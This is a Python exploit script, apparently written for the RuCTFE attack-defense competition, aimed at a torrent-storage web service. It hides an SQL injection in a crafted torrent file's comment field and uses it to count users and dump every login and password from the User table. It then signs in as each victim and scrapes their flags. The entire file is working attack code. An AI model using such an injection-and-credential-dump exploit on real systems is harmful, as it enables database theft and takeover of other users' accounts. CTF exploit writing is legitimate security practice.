#!/usr/bin/python3
import os
import re
from base64 import b64decode
from random import choice
from string import ascii_letters

import io
import requests
import sys

from bencoder import make_dictionary

REGISTER_URL_TEMPLATE = "http://{hostport}/signup?password={password}&login={login}"
UPLOAD_URL_TEMPLATE = "http://{hostport}/upload_private"
AUTH_URL_TEMPLATE = "http://{hostport}/signin?login={login}&password={password}"
PRIVATE_STORAGE_URL_TEMPLATE = "http://{hostport}/private_storage"
RESULT_PATTERN = re.compile(r"<td>(.{50,1000})=</td>")
ANCHOR_PATTERN = re.compile(r'page_number=(\d+)">&raquo;</a>')
COUNT_PATTERN = re.compile(r"<td>(\d{2,1000}|[1-9])</td>")
FLAG_PATTERN = re.compile(r"([0-9A-Z]{31}=)")


def register(hostport, login, password):
    register_url = REGISTER_URL_TEMPLATE.format(
        hostport=hostport,
        login=login,
        password=password,
    )
    requests.get(register_url).raise_for_status()


def auth(hostport, login, password):
    auth_url = AUTH_URL_TEMPLATE.format(
        hostport=hostport,
        login=login,
        password=password,
    )
    r = requests.get(
        auth_url,
    )
    r.raise_for_status()
    return dict(r.request._cookies)


def injection_request(hostport, req, user, password):
    file_data = make_dictionary({
            b'announce': b'ructfe.org',
            b'creation date': 0,
            b'comment': "','',0,({}),0,'{}');--".format(req, user).encode(),
            b'created by': b'Pirate bay',
            b'info': {
                b'piece length': 1024,
                b'length': 1024,
                b'pieces': os.urandom(20),
                b'name': b'name'
            }
        })
    file = io.BytesIO(file_data)
    cookies = auth(hostport, user, password)
    files = {'upload_file': file}
    response = requests.post("http://{}/upload_private".format(hostport), cookies=cookies, files=files)
    response.raise_for_status()


def get_count(hostport, user, password):
    cookies = auth(hostport, user, password)
    response = requests.get(
        PRIVATE_STORAGE_URL_TEMPLATE.format(
            hostport=hostport
        ),
        cookies=cookies,
    ).content.decode()
    return re.findall(COUNT_PATTERN, response)


def get_response(hostport, cookies):
    return requests.get(
        PRIVATE_STORAGE_URL_TEMPLATE.format(
            hostport=hostport
        ),
        cookies=cookies,
    ).content.decode()


def get_accounts(hostport, user, password):
    cookies = auth(hostport, user, password)
    response = get_response(hostport, cookies)
    result = re.findall(RESULT_PATTERN, response)
    pages = re.findall(ANCHOR_PATTERN, response)
    if pages:
        pages_max_count = int(pages[0])
        for page_number in range(1, pages_max_count + 1):
            result += re.findall(RESULT_PATTERN, response)
    return result


def gen(length=4):
    return "".join(choice(ascii_letters) for _ in range(length))


def steal_accounts(hostport):
    login, password = gen(), gen(1)
    print("login: {}".format(login))
    print("password: {}".format(password))
    register(hostport, login, password)
    injection_request(hostport, "SELECT COUNT(*) FROM User", login, password)
    users_count = int(get_count(hostport, login, password)[0])
    print("Users count:", users_count)
    for i in range(users_count):
        injection_request(hostport, "SELECT login||'|'||password_base FROM User LIMIT {},1".format(i), login, password)
    return get_accounts(hostport, login, password)


def steal_flag(hostport, account):
    login, password = account.split("|")
    password = b64decode(password + '=').decode()
    # print(login, password)
    cookies = auth(hostport, login, password)
    response = get_response(hostport, cookies)
    flags = re.findall(FLAG_PATTERN, response)
    if flags:
        return flags[0]


def main():
    if len(sys.argv) == 1:
        print("usage:\n./sploit host port")
    elif len(sys.argv) == 3:
        hostport = "{}:{}".format(*sys.argv[1:3])
        accounts = steal_accounts(hostport)
        for flag in (steal_flag(hostport, account) for account in accounts):
            if flag:
                print(flag)
    else:
        print("incorrect count of arguments")

if __name__ == '__main__':
    main()
